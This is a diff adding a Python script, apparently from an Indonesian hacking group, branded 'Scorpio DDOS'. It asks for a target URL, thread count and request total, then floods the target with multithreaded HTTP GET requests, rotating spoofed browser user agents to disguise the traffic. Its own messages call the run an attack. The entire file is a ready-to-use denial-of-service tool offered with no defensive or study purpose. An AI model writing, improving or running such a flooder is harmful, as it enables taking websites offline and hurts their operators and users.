@@ -1,0 +1,76 @@
+import os
+import requests
+import random
+import time
+from threading import Thread
+
+# === BANNER ===
+os.system("clear")
+os.system("figlet Scorpio DDOS")
+print("TOOLS BY sukaGLITCH01\n")
+print("\nTerima kasih kepada:")
+print("  PYSCODES, ERRYX, JANU, SMILLING_404, MR.CULA, M FARKHAN")
+print("Semoga kalian sehat dan sukses selalu!")
+
+# === USER AGENTS ===
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+]
+
+# === INPUT ===
+target_url = input("Masukkan URL target (contoh: https://example.com): ").strip()
+jumlah_thread = int(input("Jumlah thread: "))
+delay = float(input("Delay antar request (detik): "))
+total_request = int(input("Jumlah total request yang ingin dikirim: "))
+
+print("\n[!] Siap memulai serangan ke target?")
+lanjut = input("Ketik 'y' untuk mulai: ").lower()
+
+if lanjut != 'y':
+    print("[-] Dibatalkan.")
+    exit()
+
+print("\n[+] Serangan dimulai...\n")
+
+# === GLOBAL COUNTER ===
+counter = 0
+
+# === REQUEST FUNCTION ===
+def send_request():
+    global counter
+    while True:
+        if counter >= total_request:
+            break
+        headers = {
+            "User-Agent": random.choice(user_agents)
+        }
+        try:
+            response = requests.get(target_url, headers=headers)
+            counter += 1
+            print(f"[{counter}] {response.status_code} => success")
+        except Exception as e:
+            print(f"[{counter}] Error => {e}")
+            counter += 1
+        time.sleep(delay)
+
+# === MULAI THREAD ===
+threads = []
+for i in range(jumlah_thread):
+    t = Thread(target=send_request)
+    t.start()
+    threads.append(t)
+
+# === TUNGGU SELESAI ===
+for t in threads:
+    t.join()
+
+# === DONE MESSAGE ===
+print("\n✅ DONE ✅")
+print("\nTerima kasih kepada:")
+print("  PYSCODES, ERRYX, JANU, SMILLING_404, MR.CULA, M FARKHAN")
+print("Semoga kalian sehat dan sukses selalu!")
